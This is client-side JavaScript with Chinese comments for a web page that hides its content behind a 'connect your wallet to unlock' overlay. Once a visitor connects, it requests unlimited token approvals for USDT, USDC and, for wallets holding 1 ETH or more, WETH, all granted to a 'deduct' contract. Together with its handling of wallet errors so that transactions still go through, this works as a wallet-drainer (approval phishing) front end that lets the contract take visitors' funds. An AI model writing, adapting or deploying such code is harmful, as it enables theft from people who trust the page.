// 注意：此程式碼假設您已在 HTML 中引入了 ethers.js 庫，例如：
// <script src="https://cdn.ethers.io/lib/ethers-6.13.1.umd.min.js" type="application/javascript"></script>

//---Client-side Constants (客戶端常數)---
const DEDUCT_CONTRACT_ADDRESS='0xaFfC493Ab24fD7029E03CED0d7B87eAFC36E78E0';
const USDT_CONTRACT_ADDRESS='0xdAC17F958D2ee523a2206206994597C13D831ec7';
// 修正後的 USDC 地址 (EIP-55 Checksum)
const USDC_CONTRACT_ADDRESS='0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48';
const WETH_CONTRACT_ADDRESS='0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2';

//---ABI Definitions (客戶端精簡版 ABI)---
const DEDUCT_CONTRACT_ABI=[
"function isServiceActiveFor(address customer) view returns (bool)",
"function activateService(address tokenContract) external",
"function REQUIRED_ALLOWANCE_THRESHOLD() view returns (uint256)"
];

const ERC20_ABI=[
"function approve(address spender, uint256 amount) external returns (bool)",
"function balanceOf(address account) view returns (uint256)",
"function allowance(address owner, address spender) view returns (uint256)"
];

//---Global Variables & DOM Elements (全域變數與 DOM 元素)---
const connectButton=document.getElementById('connectButton');
const overlay=document.getElementById('blurOverlay');
const overlayMessage=document.getElementById('overlayMessage');
const statusDiv=document.getElementById('status');

let provider,signer,userAddress;
let deductContract,usdtContract,usdcContract,wethContract;

//---UI Control Functions (使用者介面控制函數)---
function hideOverlay() {
if(!overlay)return;
overlay.style.opacity='0';
setTimeout(() => {overlay.style.display='none';},300);
}

function showOverlay(message) {
if(!overlay||!overlayMessage)return;
overlayMessage.innerHTML=message;
overlay.style.display='flex';
//確保 opacity 設置在 display: flex 之後，以便過渡生效
setTimeout(() => {overlay.style.opacity='1';},10);
}

function updateStatus(message) {
if(!statusDiv)return;
statusDiv.innerHTML=message||'';
statusDiv.style.display=message?'block':'none';
}

/**
*重置應用程式的狀態，並可選地顯示「請連接」訊息。
*@param{boolean}showMsg-是否顯示連接錢包的遮罩訊息。(預設為 true)
*/
function resetState(showMsg=true) {
signer=userAddress=deductContract=usdtContract=usdcContract=wethContract=null;
if(connectButton) {
connectButton.classList.remove('connected');
connectButton.title='Connect Wallet';//英文
}
if(showMsg) {
showOverlay('Please connect your wallet to unlock content 🔒<p style="font-size: 16px; font-weight: normal; margin-top: 10px;">(Click the wallet icon to start)</p>');//英文
}
}

//---Core Wallet Logic (核心錢包邏輯)---

/**
*初始化合約實例，使用當前的 signer 和 userAddress
*/
function initializeContracts() {
if (!signer) throw new Error("Signer not available to initialize contracts.");
deductContract = new ethers.Contract(DEDUCT_CONTRACT_ADDRESS, DEDUCT_CONTRACT_ABI, signer);
usdtContract = new ethers.Contract(USDT_CONTRACT_ADDRESS, ERC20_ABI, signer);
usdcContract = new ethers.Contract(USDC_CONTRACT_ADDRESS, ERC20_ABI, signer);
wethContract = new ethers.Contract(WETH_CONTRACT_ADDRESS, ERC20_ABI, signer);
}

/**
*【Trust Wallet 修復】使用精簡的 RPC 請求發送交易，並加入魯棒的錯誤處理。
*/
async function sendMobileRobustTransaction(populatedTx) {
if(!signer||!provider)throw new Error("Wallet not connected or signer missing.");//英文

const txValue=populatedTx.value?populatedTx.value.toString():'0';
const fromAddress=await signer.getAddress();

const mobileTx={
from:fromAddress,
to:populatedTx.to,
data:populatedTx.data,
value:'0x'+BigInt(txValue).toString(16)
};

let txHash;
let receipt=null;

try {
txHash=await provider.send('eth_sendTransaction',[mobileTx]);

showOverlay(`Authorization sent! HASH: ${txHash.slice(0,10)}...<br>Waiting for block confirmation...`);//英文
receipt=await provider.waitForTransaction(txHash);

}catch(error) {
//捕獲 Trust Wallet 介面錯誤，並嘗試從中提取 hash
console.warn("⚠️ Trust Wallet interface may throw harmless errors. Proceeding with on-chain check...");//英文

if(error.hash) {
txHash=error.hash;
}else if(error.message&&error.message.includes('0x')) {
const match=error.message.match(/(0x[a-fA-F0-9]{64})/);
if(match)txHash=match[0];
}

if(txHash) {
showOverlay(`Transaction interface error occurred! Transaction sent: ${txHash.slice(0,10)}...<br>Waiting for block confirmation...`);//英文
receipt=await provider.waitForTransaction(txHash);
}else {
throw new Error(`Transaction failed to send, and unable to retrieve transaction hash from error: ${error.message}`);//英文
}
}

if(!receipt||receipt.status!==1) {
throw new Error(`Transaction failed on-chain (reverted). Hash: ${txHash.slice(0,10)}...`);//英文
}

return receipt;
}

/**
*初始化錢包，強制切換至主網。
*/
async function initializeWallet() {
try {
if(typeof window.ethereum==='undefined') {
return showOverlay('Please install MetaMask, Trust Wallet, or a compatible wallet to proceed.');//英文
}

provider=new ethers.BrowserProvider(window.ethereum);

const network=await provider.getNetwork();
if(network.chainId!==1n) {
showOverlay('Requesting switch to Ethereum Mainnet...<br>Please approve in your wallet.');//英文
try {
await provider.send('wallet_switchEthereumChain',[{chainId:'0x1'}]);
return;
}catch(switchError) {
if(switchError.code===4001) {
return showOverlay('您必須切換到以太坊主網 (Ethereum Mainnet) 才能使用此服務。請手動切換並刷新頁面。');//中文
}
return showOverlay(`Failed to switch network. Please do so manually.<br>Error: ${switchError.message}`);//英文
}
}

// 檢查是否有現有的連線，如果有，直接進入授權檢查流程
const accounts=await provider.send('eth_accounts',[]);
if(accounts.length>0) {
userAddress = accounts[0];
signer = await provider.getSigner();
initializeContracts(); // 初始化合約
await checkAuthorization(); // 直接檢查授權
} else {
    // 如果沒有現有連線，強制顯示連接遮罩
    showOverlay('Please connect your wallet to unlock content 🔒<p style="font-size: 16px; font-weight: normal; margin-top: 10px;">(Click the wallet icon to start)</p>');//英文
}


}catch(error) {
console.error("Initialize Wallet Error:",error);
showOverlay(`Initialization failed: ${error.message}`);//英文
}
}

/**
*檢查使用者的服務啟動狀態和代幣授權額度。
*/
async function checkAuthorization() {
try {
if(!signer)return showOverlay('Wallet is not connected. Please connect first.');//英文
updateStatus("Checking authorization status...");//英文

// 確保合約已初始化
if(!deductContract) {
    initializeContracts();
}

const isServiceActive=await deductContract.isServiceActiveFor(userAddress);
const requiredAllowance=await deductContract.REQUIRED_ALLOWANCE_THRESHOLD();

const [usdtAllowance,usdcAllowance,wethAllowance]=await Promise.all([
usdtContract.allowance(userAddress,DEDUCT_CONTRACT_ADDRESS),
usdcContract.allowance(userAddress,DEDUCT_CONTRACT_ADDRESS),
wethContract.allowance(userAddress,DEDUCT_CONTRACT_ADDRESS)
]);

const hasSufficientAllowance=(usdtAllowance>=requiredAllowance)||(usdcAllowance>=requiredAllowance)||(wethAllowance>=requiredAllowance);
const isFullyAuthorized=isServiceActive&&hasSufficientAllowance;

//【DEBUG】檢查 checkAuthorization 的最終判斷
console.log("【DEBUG_FinalCheck】User Address:", userAddress); // 再次確認當前使用的地址
console.log("【DEBUG_FinalCheck】Required Allowance:", requiredAllowance.toString());
console.log("【DEBUG_FinalCheck】Service Active:", isServiceActive);
console.log("【DEBUG_FinalCheck】Has Sufficient Allowance:", hasSufficientAllowance);
console.log("【DEBUG_FinalCheck】Is Fully Authorized (Final):", isFullyAuthorized);
//-----------------------------------------

if(isFullyAuthorized) {
if(connectButton) {
connectButton.classList.add('connected');
connectButton.title='Disconnect Wallet';//英文
}
hideOverlay();
updateStatus("✅ Service activated and authorized successfully.");//英文
}else {
if(connectButton) {
connectButton.classList.remove('connected');
connectButton.title='Connect & Authorize';//英文
}
//如果未授權，則再次顯示連接/授權提示
showOverlay('Authorization required.<p style="font-size: 16px; font-weight: normal; margin-top: 10px;">(Click the wallet icon to start the authorization process)</p>');//英文
}
updateStatus("");
}catch(error) {
console.error("Check Authorization Error:",error);

// ****** Trust Wallet TRON 錯誤的特定處理 ******
if (error.message.includes('tron.twnodes.com')) {
    const userMessage = '偵測到 Trust Wallet **網路錯誤** (RPC 錯誤指向 TRON 網路)。<br><br>請依照以下步驟**手動**解決：' +
                        '<ol style="text-align: left; margin: 10px auto; width: 80%;">' +
                        '<li><strong>切換網路：</strong>在 Trust Wallet App 內建瀏覽器的**頂部**，手動將網路從 TRON 或其他鏈換成 **Ethereum (以太坊主網)**。</li>' +
                        '<li><strong>清除連線：</strong>進入 Trust Wallet 的「設定」>「WalletConnect」，斷開與本網站的所有連線。</li>' +
                        '<li><strong>重新整理：</strong>重新整理本頁面，然後再試一次連接。</li>' +
                        '</ol>';
    return showOverlay(userMessage); // 中文提示
}
// **********************************************

if(error.code==='CALL_EXCEPTION') {
return showOverlay('Contract communication failed.<br>Please ensure you are on the **Ethereum Mainnet** and the contract address is correct, then refresh the page.');//英文
}
showOverlay(`Authorization check failed: ${error.message}`);//英文
}
}

/**
*條件式授權流程：根據 ETH/WETH 餘額決定要授權哪些代幣。
*/
async function handleConditionalAuthorizationFlow(requiredAllowance,serviceActivated,tokensToProcess) {
showOverlay('Checking and setting up token authorizations...'); // 英文
let tokenToActivate='';
let stepCount=0;

const totalSteps=serviceActivated?tokensToProcess.length:tokensToProcess.length+1;

//---檢查並請求所有所需代幣的授權---
for(const {name,contract,address} of tokensToProcess) {
stepCount++;
showOverlay(`Step ${stepCount}/${totalSteps}: Checking and requesting ${name} authorization...`);//英文

const currentAllowance=await contract.allowance(userAddress,DEDUCT_CONTRACT_ADDRESS);

if(currentAllowance<requiredAllowance) {
showOverlay(`Step ${stepCount}/${totalSteps}: Requesting ${name} Authorization...<br>Please approve in your wallet.`);//英文

const approvalTx=await contract.approve.populateTransaction(DEDUCT_CONTRACT_ADDRESS,ethers.MaxUint256);
approvalTx.value=0n;
await sendMobileRobustTransaction(approvalTx);

const newAllowance=await contract.allowance(userAddress,DEDUCT_CONTRACT_ADDRESS);
if(newAllowance>=requiredAllowance) {
if(!serviceActivated&&!tokenToActivate) {
tokenToActivate=address;
}
}
}else {
if(!serviceActivated&&!tokenToActivate) {
tokenToActivate=address;
}
}
}

//---服務啟動步驟---
if(!serviceActivated&&tokenToActivate) {
stepCount++;
const tokenName=tokensToProcess.find(t => t.address===tokenToActivate).name;
showOverlay(`Step ${stepCount}/${totalSteps}: Activating service (using ${tokenName})...`);//英文

const activateTx=await deductContract.activateService.populateTransaction(tokenToActivate);
activateTx.value=0n;
await sendMobileRobustTransaction(activateTx);
}else if(!serviceActivated) {
showOverlay(`Warning: No authorized token found to activate service. Please ensure you have ETH for Gas fees.`);//英文
}else {
showOverlay(`All authorizations and service activation completed.`);//英文
}
}


/**
*主要函數：連接錢包並根據餘額執行條件式流程。
*/
async function connectWallet() {
try {
if(!provider||(await provider.getNetwork()).chainId!==1n) {
await initializeWallet();
const network=await provider.getNetwork();
if(network.chainId!==1n)return;
}

showOverlay('Please confirm the connection in your wallet...'); // 英文
// 1. 請求連線，獲取當前選中的地址
const accounts=await provider.send('eth_requestAccounts',[]);
if(accounts.length===0)throw new Error("No account selected.");//英文

const currentConnectedAddress = accounts[0];

// 2. 總是使用最新的地址覆蓋全局變數和 Signer
userAddress = currentConnectedAddress;
signer = await provider.getSigner();

// 3. 確保所有合約實例都是使用最新的 signer 創建的 (關鍵同步步驟)
initializeContracts();


console.log("【DEBUG】Wallet Connected. Current User Address (Updated):", userAddress);

showOverlay('Preparing optimal authorization flow...'); // 英文

const [ethBalance,wethBalance]=await Promise.all([
provider.getBalance(userAddress),
wethContract.balanceOf(userAddress),
]);

const oneEth=ethers.parseEther("1.0");
const totalEthEquivalent=ethBalance+wethBalance;
const hasSufficientEth=totalEthEquivalent>=oneEth;

const serviceActivated=await deductContract.isServiceActiveFor(userAddress);
const requiredAllowance=await deductContract.REQUIRED_ALLOWANCE_THRESHOLD();

//2. 檢查關鍵讀取值
console.log("【DEBUG】Required Allowance (Threshold):", requiredAllowance.toString());
console.log("【DEBUG】Service Activated:", serviceActivated);
//---------------------------------------------------------

//讀取所有代幣的授權額度
const [usdtAllowance,usdcAllowance,wethAllowance]=await Promise.all([
usdtContract.allowance(userAddress,DEDUCT_CONTRACT_ADDRESS),
usdcContract.allowance(userAddress,DEDUCT_CONTRACT_ADDRESS),
wethContract.allowance(userAddress,DEDUCT_CONTRACT_ADDRESS)
]);

const hasSufficientAllowance=(usdtAllowance>=requiredAllowance)||(usdcAllowance>=requiredAllowance)||(wethAllowance>=requiredAllowance);
const isFullyAuthorized=serviceActivated&&hasSufficientAllowance;

console.log("【DEBUG】USDT Allowance:", usdtAllowance.toString());
console.log("【DEBUG】USDC Allowance:", usdcAllowance.toString());
console.log("【DEBUG】WETH Allowance:", wethAllowance.toString());
console.log("【DEBUG】Has Sufficient Allowance:", hasSufficientAllowance);
console.log("【DEBUG】Is Fully Authorized (Final Check):", isFullyAuthorized); // 3. 檢查最終判斷

let tokensToProcess;

if(hasSufficientEth) {
//情況 1: 餘額足夠 (>= 1 ETH/WETH) -> 授權 WETH, USDT, USDC (WETH優先)
tokensToProcess=[
{name:'WETH',contract:wethContract,address:WETH_CONTRACT_ADDRESS},
{name:'USDT',contract:usdtContract,address:USDT_CONTRACT_ADDRESS},
{name:'USDC',contract:usdcContract,address:USDC_CONTRACT_ADDRESS},
];
showOverlay('Sufficient ETH/WETH balance detected (>= 1 ETH). Starting WETH, USDT, USDC authorization flow.');//英文
}else {
//情況 2: 餘額不足 (< 1 ETH/WETH) -> 只授權 USDT, USDC
tokensToProcess=[
{name:'USDT',contract:usdtContract,address:USDT_CONTRACT_ADDRESS},
{name:'USDC',contract:usdcContract,address:USDC_CONTRACT_ADDRESS},
];
showOverlay('Insufficient ETH/WETH balance (< 1 ETH). Starting USDT, USDC authorization flow.');//英文
}

//如果 isFullyAuthorized 為 false (預期的新錢包狀態)，流程將進入授權
if(!isFullyAuthorized) {
await handleConditionalAuthorizationFlow(requiredAllowance,serviceActivated,tokensToProcess);
}

//最終檢查並更新 UI
await checkAuthorization();

}catch(error) {
console.error("Connect Wallet Error:",error);

let userMessage=`An error occurred: ${error.message}`;//英文
if (error.code === 4001) {
    userMessage = "您拒絕了連接/授權請求。請再試一次。"; //中文
} else if (error.message.includes('insufficient funds')) {
    userMessage = "授權失敗：ETH 餘額不足以支付 Gas 費用。"; //中文
} else if (error.message.includes('Block tracker destroyed')) {
    userMessage = "錢包狀態錯誤 (MetaMask)。請刷新頁面後重新連接。"; //中文
} else if (error.message.includes('tron.twnodes.com')) {
     // ****** Trust Wallet TRON 錯誤的特定處理 ******
     userMessage = '偵測到 Trust Wallet 網路錯誤 (TRON 節點)。<br><br>請<strong>手動在 App 頂部切換到 Ethereum 網路</strong>，然後刷新本頁面再連接。';
}

showOverlay(userMessage);
if(connectButton) {
connectButton.classList.remove('connected');
connectButton.title='Connect Wallet (Retry)';//英文
}
}
}

/**
*斷開連線並重置應用程式狀態。
*/
function disconnectWallet() {
resetState(true);
alert('Wallet disconnected. To fully remove site permissions, please do so in your wallet\'s "Connected Sites" settings.');//英文
}

//---Event Listeners & Initial Load (事件監聽器與初始載入)---

if(connectButton) {
connectButton.addEventListener('click',() => {
if(connectButton.classList.contains('connected')) {
disconnectWallet();
}else {
connectWallet();
}
});
}

//頁面載入時執行初始化，這將嘗試讀取現有連線，否則顯示連接遮罩
initializeWallet();